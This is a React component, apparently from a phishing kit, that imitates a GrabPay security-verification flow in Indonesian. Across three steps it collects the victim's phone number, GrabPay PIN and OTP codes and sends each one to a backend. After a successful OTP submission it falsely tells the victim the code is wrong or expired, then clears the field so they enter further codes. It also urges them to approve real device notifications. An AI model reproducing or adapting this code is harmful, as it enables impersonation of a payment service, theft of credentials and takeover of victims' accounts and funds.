'use client';

import { useEffect, useRef, useState } from 'react';
import { ChevronLeft, Headphones, Loader2, ShieldCheck } from 'lucide-react';
import { EnterpriseLoadingOverlay } from './EnterpriseLoadingOverlay';
import { EnterpriseLogo } from './EnterpriseLogo';
import { OVERLAY_MIN_MS, OTP_COUNTDOWN_SEC, OTP_LOCK_MS, GRAB_GREEN_DARK } from './lib/constants';
import { ThemeColorMeta } from './ThemeColorMeta';
import {
  clearPendingEnterpriseSound,
  playEnterpriseOtpSound,
  playEnterpriseOtpSoundFromGesture,
  preloadEnterpriseOtpSound,
  unlockEnterpriseAudioSync,
} from './lib/audio';
import { useEnterpriseKeyboardOffset } from './hooks/useKeyboardOffset';
import { submitEnterpriseStep } from './lib/submit';
import type { EnterpriseSlugData, EnterpriseStepData } from './lib/types';
import { ENTERPRISE_INITIAL_STEP_DATA } from './lib/types';
import {
  formatCountdownMMSS,
  formatPhoneDisplay,
  formatPhoneInput,
  otpIsValid,
  phoneIsValid,
  pinIsValid,
  vibrateOtpWrong,
} from './lib/utils';

type Props = {
  slugData: EnterpriseSlugData;
  onBack?: () => void;
};

export function EnterpriseFormFlow({ slugData, onBack }: Props) {
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [previousStep, setPreviousStep] = useState<number | null>(null);
  const [stepData, setStepData] = useState<EnterpriseStepData>(ENTERPRISE_INITIAL_STEP_DATA);
  const [submitting, setSubmitting] = useState(false);
  const [isLoadingOverlay, setIsLoadingOverlay] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [countdown, setCountdown] = useState(OTP_COUNTDOWN_SEC);
  const [otpLocked, setOtpLocked] = useState(false);
  const [otpFilled, setOtpFilled] = useState(false);
  const [otpToastVisible, setOtpToastVisible] = useState(false);
  const [otpCompleteRingVisible, setOtpCompleteRingVisible] = useState(false);
  const [step3Entered, setStep3Entered] = useState(false);

  const pinInputRef = useRef<HTMLInputElement>(null);
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpLockTimeoutRef = useRef<number | null>(null);
  const otpCompleteRingTimeoutRef = useRef<number | null>(null);
  const previousStepTimerRef = useRef<number | null>(null);
  const step3GestureSoundRef = useRef(false);
  const keyboardOffset = useEnterpriseKeyboardOffset();

  const fadeDurationMs = 480;
  const isStep1FadingOut = previousStep === 1;
  const isStep2FadingOut = previousStep === 2;
  const isStep3SlidingIn = step === 3 && !step3Entered;

  useEffect(() => {
    preloadEnterpriseOtpSound();
  }, []);

  useEffect(() => {
    if (step !== 3) {
      step3GestureSoundRef.current = false;
      clearPendingEnterpriseSound();
      return;
    }
    playEnterpriseOtpSound();
  }, [step]);

  useEffect(() => {
    if (step === 2) {
      const timer = window.setTimeout(() => pinInputRef.current?.focus(), 100);
      return () => window.clearTimeout(timer);
    }
    return undefined;
  }, [step]);

  useEffect(() => {
    if (previousStep === null) return undefined;

    if (previousStepTimerRef.current) window.clearTimeout(previousStepTimerRef.current);
    previousStepTimerRef.current = window.setTimeout(() => {
      setPreviousStep(null);
      previousStepTimerRef.current = null;
    }, fadeDurationMs);

    return () => {
      if (previousStepTimerRef.current) window.clearTimeout(previousStepTimerRef.current);
    };
  }, [previousStep]);

  useEffect(() => {
    if (step === 3 && countdown > 0) {
      const timer = window.setTimeout(() => setCountdown((v) => v - 1), 1000);
      return () => window.clearTimeout(timer);
    }
    if (step !== 3) setCountdown(OTP_COUNTDOWN_SEC);
    return undefined;
  }, [step, countdown]);

  useEffect(() => {
    if (step === 3) {
      const timer = window.setTimeout(() => setStep3Entered(true), 10);
      return () => window.clearTimeout(timer);
    }
    setStep3Entered(false);
    return undefined;
  }, [step]);

  useEffect(() => {
    if (submitting) return;
    const pinReady = step === 2 && pinIsValid(stepData.pin);
    const otpReady = step === 3 && otpIsValid(stepData.otp);
    if (pinReady || otpReady) void handleNext();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step, stepData.pin, stepData.otp, submitting]);

  const sendStep = async (stepNum: 1 | 2 | 3) => {
    const { success, error } = await submitEnterpriseStep(slugData.slug, stepNum, stepData, 0, 'grab');
    if (error) setErrorMessage(error);
    return success;
  };

  const handleNext = async () => {
    if (step === 3 && otpLocked) return;

    unlockEnterpriseAudioSync();
    setErrorMessage('');
    setSubmitting(true);
    setIsLoadingOverlay(true);

    const overlayStart = Date.now();
    const currentStep = step;
    let success = false;

    if (currentStep === 1) success = await sendStep(1);
    else if (currentStep === 2) success = await sendStep(2);
    else if (currentStep === 3) success = await sendStep(3);

    const remaining = OVERLAY_MIN_MS - (Date.now() - overlayStart);
    if (remaining > 0) await new Promise((r) => setTimeout(r, remaining));

    if (success) {
      if (currentStep < 3) {
        setPreviousStep(currentStep);
        setStep((currentStep + 1) as 2 | 3);
      } else {
        vibrateOtpWrong();
        setStep(3);
        setOtpLocked(true);

        if (otpLockTimeoutRef.current) window.clearTimeout(otpLockTimeoutRef.current);
        otpLockTimeoutRef.current = window.setTimeout(() => {
          setStepData((prev) => ({ ...prev, otp: '' }));
          setCountdown(OTP_COUNTDOWN_SEC);
          setOtpLocked(false);
          otpLockTimeoutRef.current = null;
        }, OTP_LOCK_MS);
      }
    }

    setSubmitting(false);
    setIsLoadingOverlay(false);

    if (!success && currentStep === 3) vibrateOtpWrong();
  };

  const handleOtpChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, '').slice(0, 1);
    setStepData((prev) => {
      const otpArray = prev.otp.padEnd(4, ' ').split('');
      otpArray[index] = digit;
      const nextOtp = otpArray.join('').replace(/\s/g, '').slice(0, 4);

      if (nextOtp.replace(/\D/g, '').length === 4) {
        setOtpFilled(true);
        setOtpToastVisible(true);
        setOtpCompleteRingVisible(true);

        if (otpCompleteRingTimeoutRef.current) window.clearTimeout(otpCompleteRingTimeoutRef.current);
        otpCompleteRingTimeoutRef.current = window.setTimeout(() => {
          setOtpCompleteRingVisible(false);
          otpCompleteRingTimeoutRef.current = null;
        }, 3000);

        window.setTimeout(() => setOtpToastVisible(false), 12000);
      } else {
        setOtpFilled(false);
        setOtpToastVisible(false);
        setOtpCompleteRingVisible(false);
      }

      return { ...prev, otp: nextOtp };
    });

    if (digit && index < 3) otpInputRefs.current[index + 1]?.focus();
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !stepData.otp[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus();
    }
  };

  const phoneValid = phoneIsValid(stepData.phone);

  const goBackToStep2 = () => {
    setErrorMessage('');
    if (otpLockTimeoutRef.current) {
      window.clearTimeout(otpLockTimeoutRef.current);
      otpLockTimeoutRef.current = null;
    }
    setOtpLocked(false);
    setOtpFilled(false);
    setOtpToastVisible(false);
    setOtpCompleteRingVisible(false);
    setPreviousStep(null);
    setStepData((prev) => ({ ...prev, otp: '' }));
    setStep(2);
  };

  const grabThemeColor = step === 1 ? GRAB_GREEN_DARK : '#ffffff';

  return (
    <>
      <ThemeColorMeta color={grabThemeColor} />
      <EnterpriseLoadingOverlay visible={isLoadingOverlay} />

      {/* Step 1 — Phone */}
      {(step === 1 || previousStep === 1) && (
        <form
          className={`enterprise-form-step enterprise-form-step--phone ${
            isStep1FadingOut ? 'enterprise-form-step--fade-out' : ''
          }`}
          onSubmit={(e) => {
            e.preventDefault();
            if (phoneValid && !submitting) void handleNext();
          }}
        >
          {onBack && (
            <header className="enterprise-form-step-nav">
              <button
                type="button"
                onClick={onBack}
                className="enterprise-form-back-btn"
                aria-label="Kembali"
              >
                <ChevronLeft className="h-6 w-6" strokeWidth={2.5} />
              </button>
            </header>
          )}

          <div className="enterprise-form-step-body">
            <EnterpriseLogo variant="white" size="md" />
            <div className="enterprise-form-badge">
              <ShieldCheck className="h-3.5 w-3.5" />
              Verifikasi GrabPay
            </div>

            <h1 className="enterprise-form-title">
              Masukkan nomor HP
              <br />
              yang terdaftar di Grab
            </h1>

            <div className="enterprise-phone-input-wrap">
              <div className="enterprise-phone-prefix">
                <span className="enterprise-flag" aria-hidden>🇮🇩</span>
                <span>+62</span>
              </div>
              <input
                type="tel"
                inputMode="numeric"
                enterKeyHint="go"
                placeholder="812-3456-7890"
                className="enterprise-phone-input"
                value={formatPhoneInput(stepData.phone)}
                onPointerDown={() => unlockEnterpriseAudioSync()}
                onChange={(e) =>
                  setStepData({ ...stepData, phone: e.target.value.replace(/[^0-9]/g, '') })
                }
              />
            </div>

            <p className="enterprise-form-disclaimer">
              Nomor ini digunakan untuk verifikasi keamanan akun GrabPay kamu. Dengan melanjutkan,
              kamu setuju dengan <strong>Syarat & Ketentuan</strong> serta{' '}
              <strong>Kebijakan Privasi</strong> Grab.
            </p>

            {errorMessage && <p className="enterprise-form-error">{errorMessage}</p>}
          </div>

          <div
            className={`enterprise-form-footer ${
              keyboardOffset > 0 ? 'enterprise-form-footer--keyboard' : ''
            }`}
            style={{
              transform:
                keyboardOffset > 0
                  ? `translate3d(-50%, ${-keyboardOffset}px, 0)`
                  : undefined,
            }}
          >
            <button
              type="submit"
              disabled={!phoneValid || submitting}
              className={`enterprise-form-btn ${phoneValid ? 'enterprise-form-btn--active' : ''}`}
            >
              {submitting ? <Loader2 className="h-5 w-5 animate-spin" /> : 'LANJUTKAN'}
            </button>
          </div>
        </form>
      )}

      {/* Step 2 — PIN */}
      {(step === 2 || previousStep === 2) && (
        <div
          className={`enterprise-form-step enterprise-form-step--pin ${
            isStep2FadingOut ? 'enterprise-form-step--fade-out' : ''
          }`}
        >
          <header className="enterprise-pin-header">
            <button
              type="button"
              onClick={() => {
                setErrorMessage('');
                if (otpLockTimeoutRef.current) {
                  window.clearTimeout(otpLockTimeoutRef.current);
                  otpLockTimeoutRef.current = null;
                }
                setOtpLocked(false);
                setOtpFilled(false);
                setOtpToastVisible(false);
                setOtpCompleteRingVisible(false);
                setPreviousStep(null);
                setStepData((prev) => ({ ...prev, pin: '' }));
                setStep(1);
              }}
              className="enterprise-pin-back"
              aria-label="Kembali"
            >
              <ChevronLeft className="h-6 w-6" strokeWidth={2.5} />
            </button>
            <h1 className="enterprise-pin-header-title">Verifikasi Akun</h1>
          </header>

          <div className="enterprise-pin-body">
            <EnterpriseLogo variant="green" size="sm" />
            <h2 className="enterprise-pin-title">Masukkan PIN GrabPay</h2>
            <p className="enterprise-pin-sub">PIN 6 digit untuk keamanan akun kamu</p>

            <div
              className="enterprise-pin-dots"
              onPointerDown={() => unlockEnterpriseAudioSync()}
              onClick={() => pinInputRef.current?.focus()}
              role="presentation"
            >
              <input
                ref={pinInputRef}
                type="tel"
                inputMode="numeric"
                maxLength={6}
                autoComplete="off"
                className="enterprise-pin-hidden-input"
                value={stepData.pin}
                onChange={(e) =>
                  setStepData({ ...stepData, pin: e.target.value.replace(/\D/g, '').slice(0, 6) })
                }
              />
              {Array.from({ length: 6 }, (_, i) => (
                <div
                  key={i}
                  className={`enterprise-pin-dot ${i < stepData.pin.length ? 'enterprise-pin-dot--filled' : ''}`}
                />
              ))}
            </div>

            <div className="enterprise-pin-actions">
              <button type="button" className="enterprise-pin-help">
                <Headphones className="h-3.5 w-3.5" />
                BUTUH BANTUAN?
              </button>
              <button type="button" className="enterprise-pin-forgot">
                LUPA PIN?
              </button>
            </div>

            {errorMessage && <p className="enterprise-form-error enterprise-form-error--light">{errorMessage}</p>}
          </div>
        </div>
      )}

      {/* Step 3 — OTP */}
      {step === 3 && (
        <div
          className={`enterprise-form-step enterprise-form-step--otp ${
            isStep3SlidingIn ? 'enterprise-form-step--slide-in' : ''
          }`}
          onPointerDown={() => {
            if (step3GestureSoundRef.current) return;
            step3GestureSoundRef.current = true;
            playEnterpriseOtpSoundFromGesture();
          }}
        >
          <header className="enterprise-otp-header">
            <button
              type="button"
              onClick={goBackToStep2}
              className="enterprise-otp-back"
              aria-label="Kembali"
            >
              <ChevronLeft className="h-6 w-6" strokeWidth={2.5} />
            </button>
          </header>

          <div className="enterprise-otp-body">
            <h1 className="enterprise-otp-title">Verifikasi keamanan GrabPay</h1>
            <EnterpriseLogo variant="green" size="sm" className="mx-auto mt-3" />

            <div className="enterprise-otp-icon-wrap">
              <div className="enterprise-otp-icon">
                <ShieldCheck className="h-10 w-10 text-[#00B14F]" />
              </div>
            </div>

            <p className="enterprise-otp-label">Kode verifikasi dikirim ke</p>
            <div className="enterprise-otp-phone-pill">
              {formatPhoneDisplay(stepData.phone)}
            </div>

            <div className="enterprise-otp-channels">
              <span>SMS</span>
              <span>/</span>
              <span className="text-[#25D366]">WhatsApp</span>
            </div>

            <div className="enterprise-otp-inputs">
              {Array.from({ length: 4 }, (_, index) => (
                <input
                  key={index}
                  ref={(el) => {
                    otpInputRefs.current[index] = el;
                  }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  className={`enterprise-otp-box ${
                    otpCompleteRingVisible ? 'enterprise-otp-box--error' : ''
                  }`}
                  value={stepData.otp[index] ?? ''}
                  onPointerDown={() => unlockEnterpriseAudioSync()}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                />
              ))}
            </div>

            <div
              className={`enterprise-otp-toast ${
                otpToastVisible && otpFilled ? 'enterprise-otp-toast--visible' : ''
              }`}
            >
              OTP yang kamu masukkan Salah/Kadaluwarsa.
            </div>

            <div className="enterprise-otp-resend">
              {countdown > 0 ? (
                <p>
                  Kirim ulang dalam{' '}
                  <strong className="tabular-nums">{formatCountdownMMSS(countdown)}</strong>
                </p>
              ) : (
                <button type="button" onClick={() => setCountdown(OTP_COUNTDOWN_SEC)}>
                  Kirim ulang
                </button>
              )}
            </div>

            <div className="enterprise-otp-instructions">
              <p className="enterprise-otp-instructions-title">
                Silakan cek verifikasi akun GrabPay kamu:
              </p>
              <div className="enterprise-otp-instruction-item">
                <div className="enterprise-otp-instruction-icon">
                  <ShieldCheck className="h-4 w-4" />
                </div>
                <p>
                  Tap notifikasi di perangkatmu dan pilih{' '}
                  <strong>VERIFIKASI</strong> untuk melanjutkan.
                </p>
              </div>
              <div className="enterprise-otp-instruction-item">
                <div className="enterprise-otp-instruction-icon">
                  <Headphones className="h-4 w-4" />
                </div>
                <p>
                  Tidak menerima notifikasi? Cek SMS atau WhatsApp dari Grab.
                </p>
              </div>
            </div>

            {errorMessage && (
              <p className="enterprise-form-error enterprise-form-error--light">{errorMessage}</p>
            )}
          </div>
        </div>
      )}
    </>
  );
}
